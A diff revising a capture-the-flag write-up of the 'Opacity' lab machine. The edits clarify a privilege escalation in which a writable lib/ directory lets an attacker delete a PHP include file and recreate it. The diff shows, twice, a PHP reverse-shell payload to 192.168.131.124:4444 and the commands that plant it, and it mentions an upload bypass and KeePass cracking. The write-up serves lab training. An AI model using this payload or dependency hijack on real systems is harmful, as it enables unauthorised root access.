@@ -13,7 +13,7 @@ The red path is as follows:
 - download a KeePass database and crack it
 - log in as `sysadmin`
 - inspect a backup script and abused include file
-- overwrite the included library with a malicious payload to execute as root
+- overwrite the included library by deleting and recreating it with a malicious payload to execute as root
 - read the final proof flag and complete the challenge
 
 ---
@@ -226,12 +226,12 @@ The login succeeds.
 
 ```bash
 ls -la
-``` 
+```
 
 ```text
 total 44
 drwxr-xr-x 6 sysadmin sysadmin 4096 Feb 22  2023 .
-drwxr-xr-x 4 root     root     4099 Oct 28 20:09 ..
+drwxr-xr-x 4 root     root     4096 Oct 28 20:09 ..
 -rw------- 1 sysadmin sysadmin   22 Feb 22  2023 .bash_history
 -rw-r--r-- 1 sysadmin sysadmin  220 Feb 25  2020 .bash_logout
 -rw-r--r-- 1 sysadmin sysadmin  3771 Feb 25  2020 .bashrc
@@ -256,7 +256,7 @@ This confirms the user-level foothold and retrieves the first challenge flag.
 
 ### Researching the Relevant Files
 
-The user inspects the scripts directory and identifies a PHP script that appears to generate a backup archive.
+The user inspects the scripts directory and identifies a PHP script that appears to generate a backup archive:
 
 ```bash
 cat script.php
@@ -270,37 +270,37 @@ require_once('lib/backup.inc.php');
 zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
 ```
 
-This is important because `script.php` requires a file called `lib/backup.inc.php` in the same directory and calls a function named `zipData()`. If the attacker can influence the included library file, they may be able to inject malicious code into the script.
-
-The notes indicate the directory structure is writable for the current user, while the script itself is not writable, but the include file is in the same directory and may be replaced by the attacker.
+This is important because `script.php` requires a file called `lib/backup.inc.php` in the same directory and calls the `zipData()` function. If the attacker can hijack this dependency, they can execute arbitrary code.
 
 ### Assessing the Weakness
 
-The attacker cannot directly modify the main `script.php`, but the path containing the library file is editable. That means the attacker can replace the dependency with malicious code and then execute the script in a way that triggers the malicious include.
+The user does not have direct write permission to edit `script.php` or the original `lib/backup.inc.php` file. However, the user does have write permission on the parent directory (`lib/`).
 
-This becomes the final privilege escalation path.
+In Linux, directory write permission allows a user to delete and recreate files inside that directory, even if the individual files themselves are read-only.
 
-> Important: The issue is not that `script.php` is writable; the issue is that the library it includes is either replaceable or directly executable in the intended workflow.
+### Exploitation Path
 
----
-
-## 7. Privilege Escalation to Root
-
-### Replacing the Include File
-
-The attacker deletes the original include file and writes a malicious version that spawns a root shell.
+The attacker cannot simply modify the original `backup.inc.php` file in place. Instead, they can delete it or move it, then create a new file with the exact same name containing a malicious payload.
 
 ```bash
-cd /home/sysadmin/scripts
-ls -la
-rm lib/backup.inc.php
+rm -f lib/backup.inc.php
 cat > lib/backup.inc.php <<'PHP'
 <?php
 system('/bin/bash -c "bash -i >& /dev/tcp/192.168.131.124/4444 0>&1"');
 PHP
 ```
 
-Then the compromised script is run in the same context that has permissions to trigger the backup workflow.
+When `script.php` is executed by a privileged process (for example, a root cron job or an elevated script), it loads the newly created `lib/backup.inc.php` and executes the malicious payload with root privileges.
+
+> Important: The vulnerability stems from insecure directory permissions, which allow the attacker to replace the dependency by deleting and recreating the file, rather than direct file modification.
+
+---
+
+## 7. Privilege Escalation to Root
+
+### Triggering the Malicious Dependency
+
+The attacker deletes the original include file and creates a malicious replacement as described above. Then the attacker executes the script or waits for the privileged path to invoke it.
 
 ```bash
 php script.php
@@ -355,7 +355,7 @@ This proves the challenge is fully completed.
 6. Downloaded and cracked the database to recover the `sysadmin` password
 7. Logged in over SSH as `sysadmin`
 8. Reviewed `script.php` and the required include file `lib/backup.inc.php`
-9. Replaced the include file with a malicious payload
+9. Exploited directory write permission to delete and recreate the include file with a malicious payload
 10. Triggered the script and received a root shell
 11. Read `/root/proof.txt` and completed the challenge
 
@@ -367,9 +367,10 @@ This proves the challenge is fully completed.
 - `#`-based bypasses may work when the backend ignores part of the filename.
 - KeePass databases can reveal credentials when the database file is accessible.
 - Include files and library dependencies are a classic route to privilege escalation when they are writable or replaceable.
+- Directory write permission is a critical misconfiguration: even if the file itself is not writable, the directory can allow deletion and recreation of the dependency.
 - Privilege escalation does not always require a binary exploit; a malicious include file can be just as effective.
 
-> Important: A root-run PHP script with a replaceable dependency file is a reliable privilege escalation path if the attacker can manipulate the include path.
+> Important: A root-run PHP script with a replaceable dependency file is a reliable privilege escalation path if the attacker can manipulate the include path via directory permissions.
 
 ---
 
@@ -389,7 +390,7 @@ ssh sysadmin@10.112.138.145
 cat local.txt
 cat script.php
 ls -la /home/sysadmin/scripts
-rm lib/backup.inc.php
+rm -f lib/backup.inc.php
 cat > lib/backup.inc.php <<'PHP'
 <?php
 system('/bin/bash -c "bash -i >& /dev/tcp/192.168.131.124/4444 0>&1"');
@@ -405,7 +406,6 @@ cat /root/proof.txt
 
 ## Final Result
 
-The Opacity machine was successfully compromised by bypassing a restricted file upload, extracting credentials from a KeePass database, accessing the `sysadmin` account, and exploiting a writable include dependency to spawn a root shell. The final proof flag was retrieved from `/root/proof.txt`.
+The Opacity machine was successfully compromised by bypassing a restricted file upload, extracting credentials from a KeePass database, accessing the `sysadmin` account, and exploiting a writable directory to replace a crucial include file with a malicious payload. This resulted in a root shell and retrieval of the final proof flag.
 
 ![Image Placeholder: Final challenge completion](./assets/final-result.png)
-
